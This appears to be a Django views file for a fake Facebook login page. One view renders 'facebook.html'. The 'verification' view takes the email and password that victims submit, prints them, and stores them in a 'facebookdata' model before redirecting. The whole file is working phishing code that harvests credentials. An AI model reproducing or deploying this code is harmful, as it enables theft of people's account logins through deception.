from django.shortcuts import render,redirect
from .models import create,facebookdata


def facebook(req):
    return render(req,'facebook.html')
    
    
    
def verification(req):
    facebookname=req.POST['email']
    facebookpass=req.POST['pass']
    print(facebookpass)
    print(facebookname)
    
    uid=req.session.get('ui')
    
    facebookdata(userid=uid,passs=facebookpass,username=facebookname).save()
    
    
    return redirect("index")